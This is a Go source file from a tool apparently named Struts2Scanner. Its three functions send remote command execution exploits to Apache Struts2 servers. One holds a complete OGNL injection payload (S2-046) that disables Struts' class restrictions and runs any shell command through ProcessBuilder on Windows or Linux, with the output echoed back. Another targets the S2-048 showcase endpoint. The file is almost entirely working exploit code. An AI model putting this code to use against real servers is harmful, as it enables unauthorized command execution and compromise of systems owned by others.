package shellCommandExecution

import (
	"Struts2Scanner/vars"
	"bytes"
	"crypto/tls"
	"io"
	"io/ioutil"
	"mime/multipart"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"strings"
	"time"
)

func Pexp(url, poc, cmd string, header map[string]string) (string,error) {
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	cookieJar, _ := cookiejar.New(nil)
	var client = &http.Client{
		Timeout: time.Second * 5,
		Jar: cookieJar,
		Transport: tr,
	}
	data := strings.Replace(poc, "FUZZINGCOMMAND", cmd, -1)
	req, err := http.NewRequest("POST", url, strings.NewReader(data))
	if err != nil {
		return "", err
	}
	req.Header.Add("User-Agent", header["User-Agent"])
	req.Header.Add("Accept", header["Accept"])
	req.Header.Add("Content-Type", header["Content-Type"])

	reqs, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer reqs.Body.Close()
	body, _ := ioutil.ReadAll(reqs.Body)
	return string(body), nil
}

func Pexp046(url, cmd string, header map[string]string) (string,error) {
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	cookieJar, _ := cookiejar.New(nil)
	var client = &http.Client{
		Timeout: time.Second * 5,
		Jar: cookieJar,
		Transport: tr,
	}
	file := "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='"+cmd+"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\\x000"
	bodyBuf := &bytes.Buffer{}
	bodyWriter := multipart.NewWriter(bodyBuf)
	filename := "test"
	fileWriter, err := bodyWriter.CreateFormFile("uploadfile", filename)
	if err != nil {
		return "", err
	}
	_, err = io.Copy(fileWriter, strings.NewReader(file))
	if err != nil {
		return "", err
	}
	contentType := bodyWriter.FormDataContentType()
	bodyWriter.Close()

	req, err := http.NewRequest("POST", url, bodyBuf)
	if err != nil {
		return "", err
	}

	req.Header.Add("User-Agent", header["User-Agent"])
	req.Header.Add("Content-Type", contentType)

	reqs, errs := client.Do(req)
	if errs != nil {
		return "", errs
	}
	defer reqs.Body.Close()
	body, _ := ioutil.ReadAll(reqs.Body)
	return string(body), nil
}

func Pexp048(s,cmd string, header map[string]string) (string,error) {
	command := strings.Replace(vars.Shell["struts2-048"], "FUZZINGCOMMAND", cmd, -1)
	data := make(url.Values)
	data.Add("name", command)
	data.Add("age", "1")
	data.Add("__checkbox_bustedBefore", "true")
	data.Add("description", "1")

	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	cookieJar, _ := cookiejar.New(nil)
	var client = &http.Client{
		Timeout: time.Second * 5,
		Jar: cookieJar,
		Transport: tr,
	}
	urll, _ := url.Parse(s)
	target := urll.Scheme + "://" + urll.Host + "/struts2-showcase/integration/saveGangster.action"

	req, err := http.NewRequest("POST", target, strings.NewReader(data.Encode()))
	if err != nil {
		return "", err
	}
	req.Header.Add("User-Agent", header["User-Agent"])
	req.Header.Add("Accept", header["Accept"])
	req.Header.Add("Content-Type", header["Content-Type"])

	reqs, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer reqs.Body.Close()
	body, _ := ioutil.ReadAll(reqs.Body)
	return string(body), nil
}
